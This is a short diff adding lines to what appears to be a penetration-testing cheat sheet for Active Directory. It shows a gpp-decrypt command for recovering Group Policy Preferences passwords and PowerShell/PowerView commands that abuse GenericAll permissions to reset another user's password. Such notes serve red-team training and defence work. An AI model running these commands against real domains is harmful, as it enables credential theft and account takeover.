@@ -97,3 +97,12 @@ Look for domain policy files! They store local admin passwords and can be decryp
 ```powershell
 gpp-decrypt "+bsY0V3d4/KgX3VJdO/vyepPfAN1zMFTiQDApgR92JE"
 ```
+# Misc
+## Abuse GenericAll to change user password
+If a user has GenericAll permissions on another user, their password can be changed.
+```powershell
+$UserPassword = ConvertTo-SecureString 'Password123!' -AsPlainText -Force
+```
+```powershell
+Set-DomainUserPassword -Identity andy -AccountPassword $UserPassword
+```
